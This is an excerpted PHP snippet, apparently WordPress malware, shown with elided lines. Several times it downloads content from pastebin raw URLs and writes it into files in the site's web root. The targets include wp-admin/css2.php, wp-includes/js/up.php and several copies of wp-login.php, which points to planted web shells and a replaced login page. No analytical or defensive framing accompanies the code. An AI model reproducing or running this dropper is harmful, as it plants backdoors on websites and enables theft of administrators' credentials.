...
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/str.php" ;
...
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css2.php" ;
$text2 = http_get('https://pastebin.com/raw/44G5GJF2');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
...
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/wp-ez.php" ;
...
$check1244 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/js/up.php" ;
...
$check1244 = $_SERVER['DOCUMENT_ROOT'] . "/wordpress/wp-login.php" ;
$text1244 = http_get('https://pastebin.com/raw/2WzW2sJq');
$open1244 = fopen($check1244, 'w');
fwrite($open1244, $text1244);
fclose($open1244);
if(file_exists($check1244)){
}
$check1244 = $_SERVER['DOCUMENT_ROOT'] . "/wp/wp-login.php" ;
$text1244 = http_get('https://pastebin.com/raw/2WzW2sJq');
$open1244 = fopen($check1244, 'w');
fwrite($open1244, $text1244);
fclose($open1244);
...
$check1244 = $_SERVER['DOCUMENT_ROOT'] . "/wp-login.php" ;
$text1244 = http_get('https://pastebin.com/raw/2WzW2sJq');
$open1244 = fopen($check1244, 'w');
fwrite($open1244, $text1244);
fclose($open1244);
